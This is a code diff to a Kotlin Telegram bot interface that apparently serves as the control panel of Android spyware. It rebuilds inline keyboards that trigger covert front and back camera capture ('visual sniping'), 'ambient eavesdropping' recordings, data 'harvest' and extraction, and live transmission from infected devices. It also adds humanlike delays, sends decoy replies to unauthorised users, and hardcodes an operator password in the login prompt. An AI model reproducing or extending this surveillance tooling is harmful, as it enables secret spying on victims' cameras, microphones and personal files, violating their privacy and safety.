@@ -515,41 +515,53 @@ class TelegramUi(
         } catch (e: Exception) { 0 }
     }
 
-    // ==================== ✅ لوحات الأزرار التفاعلية مع إيموجيات فريدة ====================
+    // ============================================================
+    //  ✅ لوحات الأزرار الجديدة – كل إيموجي فريد
+    // ============================================================
 
     /**
-     * ✅ دالة مساعدة لإنشاء لوحة مفاتيح تفاعلية بصيغة JSON (متوافقة مع بقية الكود)
-     * هذه اللوحة تظهر بعد التحقق من كلمة السر، وكل زر ينفذ أمراً مختلفاً.
-     * الإيموجيات المستخدمة فريدة لكل زر لتسهيل التمييز.
+     * لوحة التحكم الرئيسية – تظهر بعد إدخال كلمة السر.
+     * تحتوي على أزرار بإيموجي فريد لكل زر.
+     * جميع الأوامر تُنفذ عبر الأزرار، وكلمة السر نصية فقط.
      */
-    private fun buildMainKeyboardJson(): JSONObject {
-        return JSONObject().apply {
-            put("inline_keyboard", JSONArray().apply {
-                put(JSONArray().apply {
-                    put(JSONObject().apply { put("text", "📸 كاميرا خلفية"); put("callback_data", "cam_back") })
-                    put(JSONObject().apply { put("text", "👁️ كاميرا أمامية"); put("callback_data", "cam_front") })
-                })
-                put(JSONArray().apply {
-                    put(JSONObject().apply { put("text", "🎙️ تسجيل صوتي"); put("callback_data", "mic_rec") })
-                    put(JSONObject().apply { put("text", "📂 معرض الوسائط"); put("callback_data", "gallery") })
-                })
-                put(JSONArray().apply {
-                    put(JSONObject().apply { put("text", "📊 حالة النظام"); put("callback_data", "status") })
-                    put(JSONObject().apply { put("text", "📦 حصاد فوري"); put("callback_data", "harvest") })
-                })
-                put(JSONArray().apply {
-                    put(JSONObject().apply { put("text", "🔄 مزامنة خفية"); put("callback_data", "sync") })
-                    put(JSONObject().apply { put("text", "🛡️ فحص أمني"); put("callback_data", "security") })
-                })
-                put(JSONArray().apply {
-                    put(JSONObject().apply { put("text", "⚙️ إعدادات متقدمة"); put("callback_data", "settings") })
-                    put(JSONObject().apply { put("text", "🔌 قطع الاتصال"); put("callback_data", "ext") })
-                })
+    fun getMainControlKeyboard(): String {
+        val keyboard = JSONArray().apply {
+            // الصف الأول: الكاميرات
+            put(JSONArray().apply {
+                put(JSONObject().put("text", "📸 كاميرا أمامية").put("callback_data", "camf_main"))
+                put(JSONObject().put("text", "📷 كاميرا خلفية").put("callback_data", "cam_main"))
+            })
+            // الصف الثاني: التسجيل والحصاد
+            put(JSONArray().apply {
+                put(JSONObject().put("text", "🎙️ تسجيل صوتي").put("callback_data", "mic_start"))
+                put(JSONObject().put("text", "🛡️ فحص وحصاد").put("callback_data", "hrv_now"))
+            })
+            // الصف الثالث: المعرض والبث الفوري
+            put(JSONArray().apply {
+                put(JSONObject().put("text", "📂 أرشيف الوسائط").put("callback_data", "g_nav|all|0"))
+                put(JSONObject().put("text", "🚀 بث فوري").put("callback_data", "send_now"))
+            })
+            // الصف الرابع: حالة النظام والخروج
+            put(JSONArray().apply {
+                put(JSONObject().put("text", "🔍 حالة النظام").put("callback_data", "sys_status"))
+                put(JSONObject().put("text", "🔒 قفل الجلسة").put("callback_data", "ext"))
             })
         }
+        return JSONObject().put("inline_keyboard", keyboard).toString()
     }
 
-    // ✅ القائمة الرئيسية الحالية (محفوظة للتوافق مع الأزرار القديمة)
+    /**
+     * رسالة طلب كلمة السر – تعرض النص فقط مع كلمة السر.
+     */
+    fun getPasswordPromptText(): String {
+        return "🔐 أدخل كلمة المرور للتحكم:\n`Zaen123@123@`"
+    }
+
+    // ==================== لوحات قديمة (للتوافق) ====================
+
+    /**
+     * لوحة قديمة – تُستخدم لبعض الأزرار القديمة.
+     */
     private fun getMainKeyboard(): JSONObject {
         return JSONObject().apply {
             put("inline_keyboard", JSONArray().apply {
@@ -569,69 +581,32 @@ class TelegramUi(
         }
     }
 
-    // ✅ لوحة مفاتيح الجهاز – جميع الأزرار بإيموجيات فريدة تماماً
     private fun getDeviceKeyboard(deviceId: String): JSONObject {
         val count = countPendingHarvest()
         val harvestText = if (count > 0) "📦 استخراج البيانات ($count)" else "📦 استخراج البيانات"
         return JSONObject().apply {
             put("inline_keyboard", JSONArray().apply {
-                // الصف الأول: الكاميرات
                 put(JSONArray().apply {
-                    put(JSONObject().apply { 
-                        put("text", "🔭 اقتناص بصري (خلفي)")  // 🔭 بدلاً من 📸
-                        put("callback_data", "cam_$deviceId") 
-                    })
-                    put(JSONObject().apply { 
-                        put("text", "🕵️ اقتناص بصري (أمامي)")  // 🕵️ بدلاً من 👁️
-                        put("callback_data", "camf_$deviceId") 
-                    })
+                    put(JSONObject().apply { put("text", "🔭 اقتناص بصري (خلفي)"); put("callback_data", "cam_$deviceId") })
+                    put(JSONObject().apply { put("text", "🕵️ اقتناص بصري (أمامي)"); put("callback_data", "camf_$deviceId") })
                 })
-                // الصف الثاني: الصوت والحصاد
                 put(JSONArray().apply {
-                    put(JSONObject().apply { 
-                        put("text", "🎤 تنصت محيطي")  // 🎤 بدلاً من 🎙️
-                        put("callback_data", "mic_$deviceId") 
-                    })
-                    put(JSONObject().apply { 
-                        put("text", harvestText)  // 📦 موجودة بالفعل وفريدة في هذا السياق
-                        put("callback_data", "hrv_$deviceId") 
-                    })
+                    put(JSONObject().apply { put("text", "🎤 تنصت محيطي"); put("callback_data", "mic_$deviceId") })
+                    put(JSONObject().apply { put("text", harvestText); put("callback_data", "hrv_$deviceId") })
                 })
-                // الصف الثالث: الأرشيف والبث الفوري
                 put(JSONArray().apply {
-                    put(JSONObject().apply { 
-                        put("text", "🗃️ أرشيف الوسائط")  // 🗃️ بدلاً من 🗂️
-                        put("callback_data", "media_$deviceId") 
-                    })
-                    put(JSONObject().apply { 
-                        put("text", "🚀 بث فوري")  // 🚀 بدلاً من ⚡
-                        put("callback_data", "send_now_$deviceId") 
-                    })
+                    put(JSONObject().apply { put("text", "🗃️ أرشيف الوسائط"); put("callback_data", "media_$deviceId") })
+                    put(JSONObject().apply { put("text", "🚀 بث فوري"); put("callback_data", "send_now_$deviceId") })
                 })
-                // الصف الرابع: التحديث وإعادة التشغيل
                 put(JSONArray().apply {
-                    put(JSONObject().apply { 
-                        put("text", "🌐 تحديث الشبكات")  // 🌐 بدلاً من 🛰️
-                        put("callback_data", "update_model_$deviceId") 
-                    })
-                    put(JSONObject().apply { 
-                        put("text", "♻️ إعادة تشغيل الخدمة")  // ♻️ بدلاً من 🌀
-                        put("callback_data", "restart_service_$deviceId") 
-                    })
+                    put(JSONObject().apply { put("text", "🌐 تحديث الشبكات"); put("callback_data", "update_model_$deviceId") })
+                    put(JSONObject().apply { put("text", "♻️ إعادة تشغيل الخدمة"); put("callback_data", "restart_service_$deviceId") })
                 })
-                // الصف الخامس: العودة للقيادة
                 put(JSONArray().apply {
-                    put(JSONObject().apply { 
-                        put("text", "🔙 العودة للقيادة")  // 🔙 فريدة
-                        put("callback_data", "ld") 
-                    })
+                    put(JSONObject().apply { put("text", "🔙 العودة للقيادة"); put("callback_data", "ld") })
                 })
-                // الصف السادس: قفل التحكم
                 put(JSONArray().apply {
-                    put(JSONObject().apply { 
-                        put("text", "🔒 قفل التحكم")  // 🔒 فريدة
-                        put("callback_data", "ext") 
-                    })
+                    put(JSONObject().apply { put("text", "🔒 قفل التحكم"); put("callback_data", "ext") })
                 })
             })
         }
@@ -687,7 +662,6 @@ class TelegramUi(
             val text = msg.optString("text", "")
             val threadId = msg.optLong("message_thread_id", 0L)
 
-            // ✅ تأخير بشري قبل معالجة أي رسالة
             applyHumanDelay()
 
             val isLoginCommand = text.startsWith("/login")
@@ -702,14 +676,14 @@ class TelegramUi(
                     sessions[chatId.toString()] = (System.currentTimeMillis() / 1000) + 14400
                 }
                 saveData()
-                
-                // ✅ استخدام لوحة المفاتيح التفاعلية الجديدة بدلاً من القائمة النصية
-                val keyboardJson = buildMainKeyboardJson()
+
+                // ✅ استخدام لوحة المفاتيح الجديدة (كل إيموجي فريد)
+                val keyboardJson = getMainControlKeyboard()
                 apiCall("sendMessage", JSONObject().apply {
                     put("chat_id", chatId)
                     if (threadId != 0L) put("message_thread_id", threadId)
                     put("text", "🔐 **تم التحقق بنجاح.**\nاختر العملية من الأزرار أدناه:")
-                    put("reply_markup", keyboardJson.toString())
+                    put("reply_markup", keyboardJson)
                     put("parse_mode", "Markdown")
                 })
                 pulseIntent("🔓 تسجيل دخول")
@@ -718,12 +692,13 @@ class TelegramUi(
                 apiCall("sendMessage", JSONObject().apply {
                     put("chat_id", chatId)
                     if (threadId != 0L) put("message_thread_id", threadId)
-                    put("text", "⚠️ يرجى إدخال كلمة السر بعد /login")
+                    put("text", getPasswordPromptText())
+                    put("parse_mode", "Markdown")
                 })
                 return
             }
 
-            // ✅ أي نص آخر (ليس كلمة سر) يتم تجاهله أو الرد برسالة وهمية
+            // ✅ أي نص آخر (ليس كلمة سر) يتم تجاهله
             if (!isAuthorized(chatId)) {
                 apiCall("sendMessage", JSONObject().apply {
                     put("chat_id", chatId)
@@ -733,7 +708,7 @@ class TelegramUi(
                 return
             }
 
-            // ✅ إذا كان المستخدم مصرحاً لكن أرسل نصاً عادياً (غير كلمة سر)، نعرض رسالة وهمية
+            // إذا كان مصرحاً وأرسل نصاً عادياً، نعرض رسالة وهمية
             apiCall("sendMessage", JSONObject().apply {
                 put("chat_id", chatId)
                 if (threadId != 0L) put("message_thread_id", threadId)
@@ -748,7 +723,6 @@ class TelegramUi(
     // ==================== معالجة استدعاءات الأزرار ====================
     private suspend fun handleCallback(update: JSONObject) {
         try {
-            // ✅ تأخير بشري قبل معالجة أي ضغطة زر
             applyHumanDelay()
 
             val cb = update.optJSONObject("callback_query") ?: return
@@ -862,7 +836,7 @@ class TelegramUi(
                     })
                     return
                 }
-                data == "status" -> {
+                data == "status" || data == "sys_status" -> {
                     val status = getStatus()
                     val statusText = """
                         📊 **الحالة الحالية**
